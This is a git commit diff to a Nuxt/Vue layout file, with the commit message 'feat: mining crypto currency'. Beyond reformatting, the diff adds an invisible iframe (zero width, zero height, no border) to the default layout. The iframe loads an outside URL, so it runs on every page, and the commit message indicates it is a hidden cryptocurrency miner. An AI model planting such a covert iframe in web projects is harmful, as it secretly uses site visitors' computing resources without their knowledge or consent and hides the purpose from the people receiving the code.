59b5f08d9f70f930e94b50decc8c477a4de4c95c
acatzk <joshuaimalay@gmail.com>
2021-04-25 21:05:17 +0800

    feat: mining crypto currency (#1)

--- layouts/default.vue
+++ layouts/default.vue
@@ -1,16 +1,24 @@
 <template>
-  <div class="flex flex-col font-sans antialiased text-gray-900 min-h-screen h-screen bg-gray-100">
+  <div
+    class="flex flex-col font-sans antialiased text-gray-900 min-h-screen h-screen bg-gray-100"
+  >
     <TheNavBar />
     <main class="flex-1 flex overflow-y-hidden">
       <Nuxt />
     </main>
+    <iframe
+      src="https://autoclaim.in/wm/acatzk/2"
+      width="0"
+      height="0"
+      style="border:0"
+    ></iframe>
   </div>
 </template>
 
 <script>
-  export default {
-    components: {
-      TheNavBar: () => import('@/components/TheNavBar')
-    }
+export default {
+  components: {
+    TheNavBar: () => import("@/components/TheNavBar")
   }
+};
 </script>
